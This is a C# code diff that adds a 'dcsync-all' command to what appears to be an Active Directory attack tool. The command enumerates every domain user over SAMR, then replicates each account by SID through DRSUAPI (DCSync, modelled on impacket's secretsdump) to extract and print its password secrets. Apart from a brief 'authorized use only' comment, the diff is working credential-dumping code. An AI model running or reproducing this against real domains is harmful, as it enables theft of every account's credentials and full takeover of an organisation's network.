@@ -114,6 +114,146 @@ internal static class DcSync
         return 0;
     }
 
+    /// <summary>
+    /// dcsync-all: enumerate the domain's user accounts over SAMR, then DCSync each one by SID
+    /// (impacket's DRSGetNCChangesSid path — no per-account DRSCrackNames). This is how secretsdump's
+    /// default whole-domain dump works: it replicates each account individually, it does not do one
+    /// whole-NC sync. Lab-first, authorized use only.
+    /// </summary>
+    public static int RunAll(string[] args)
+    {
+        if (args.Length < 5)
+        {
+            Console.Error.WriteLine(
+                "usage: dcsync-all <dc-host> <user> <password> <domain-fqdn> [netbios-domain] [epm-port]");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string domainFqdn = args[4];
+        string netbios = args.Length >= 6 ? args[5] : domainFqdn.Split('.')[0].ToUpperInvariant();
+        int epmPort = args.Length >= 7 ? int.Parse(args[6]) : 135;
+
+        // 1) Enumerate the domain's users (RID + name) and the domain SID over sealed SAMR.
+        SamrSid? domainSid;
+        List<SamrRidEntry> users;
+        {
+            DcerpcPipe samrMapper = DcerpcPipe.OverTcp(host, epmPort);
+            if (!samrMapper.Bind(DcerpcInterface.Epm).Accepted)
+            {
+                Console.Error.WriteLine("Bind to endpoint mapper rejected.");
+                return 1;
+            }
+
+            EpmMapResult? samrEndpoint = Epm.MapTcp(samrMapper, DcerpcInterface.Samr);
+            samrMapper.Close();
+            if (samrEndpoint is null)
+            {
+                Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for samr.");
+                return 1;
+            }
+
+            DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrEndpoint.Port);
+            if (!samr.BindAuthenticated(DcerpcInterface.Samr, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
+            {
+                Console.Error.WriteLine("Authenticated samr bind rejected.");
+                return 1;
+            }
+
+            SamrHandleResult server = Samr.Connect(samr);
+            SamrEnumResult domains = Samr.EnumerateDomains(samr, server.Handle);
+            string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
+            (domainSid, _) = Samr.LookupDomain(samr, server.Handle, accountDomain);
+            if (domainSid is null)
+            {
+                Console.Error.WriteLine($"Could not resolve the domain SID for {accountDomain}.");
+                return 1;
+            }
+
+            SamrHandleResult dom = Samr.OpenDomain(samr, server.Handle, domainSid);
+            users = Samr.EnumerateUsers(samr, dom.Handle).Entries.ToList();
+            Samr.CloseHandle(samr, dom.Handle);
+            Samr.CloseHandle(samr, server.Handle);
+            samr.Close();
+        }
+
+        Console.WriteLine($"Enumerated {users.Count} user(s) in {netbios} (domain SID {domainSid}).");
+
+        // 2) Bind DRSUAPI and establish the replication handle.
+        DcerpcPipe drsMapper = DcerpcPipe.OverTcp(host, epmPort);
+        drsMapper.Bind(DcerpcInterface.Epm);
+        EpmMapResult? drsEndpoint = Epm.MapTcp(drsMapper, DcerpcInterface.Drsuapi);
+        drsMapper.Close();
+        if (drsEndpoint is null)
+        {
+            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for drsuapi.");
+            return 1;
+        }
+
+        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsEndpoint.Port);
+        if (!pipe.BindAuthenticated(DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
+        {
+            Console.Error.WriteLine("Authenticated drsuapi bind rejected.");
+            return 1;
+        }
+
+        byte[]? sessionKey = pipe.SessionKey;
+        if (sessionKey is null)
+        {
+            Console.Error.WriteLine("No DCERPC session key after bind.");
+            return 1;
+        }
+
+        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
+        if (bind.ReplEpoch != 0)
+        {
+            bind = Drsuapi.ParseBindResponse(pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
+        }
+
+        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
+            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo, Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
+
+        Console.WriteLine($"DRSBind ok — replicating {users.Count} account(s) by SID (EXOP_REPL_OBJ)…");
+        Console.WriteLine();
+
+        // 3) Replicate each account by SID and print its secrets.
+        foreach (SamrRidEntry u in users)
+        {
+            byte[] packedSid = PackSid(domainSid, u.Rid);
+            try
+            {
+                DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
+                    pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
+                        Drsuapi.BuildGetNCChangesStubBySid(bind.Handle, ntdsDsaGuid, packedSid)));
+                PrintSecrets(obj, sessionKey, u.Name);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine($"  [!] {u.Name} (RID {u.Rid}) failed: {ex.Message}");
+            }
+        }
+
+        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
+        pipe.Close();
+        return 0;
+    }
+
+    /// <summary>Packs a domain SID + RID into the 28-byte NT4SID a DSNAME carries.</summary>
+    private static byte[] PackSid(SamrSid domainSid, uint rid)
+    {
+        uint[] subs = domainSid.SubAuthorities.Append(rid).ToArray();
+        var w = new List<byte> { domainSid.Revision, (byte)subs.Length };
+        w.AddRange(domainSid.IdentifierAuthority);
+        foreach (uint s in subs)
+        {
+            w.AddRange(BitConverter.GetBytes(s));
+        }
+
+        return w.ToArray();
+    }
+
     private static void PrintSecrets(DrsReplicaObject obj, byte[] sessionKey, string fallbackName)
     {
         byte[]? sidValue = obj.FirstValue(Drsuapi.AttObjectSid);
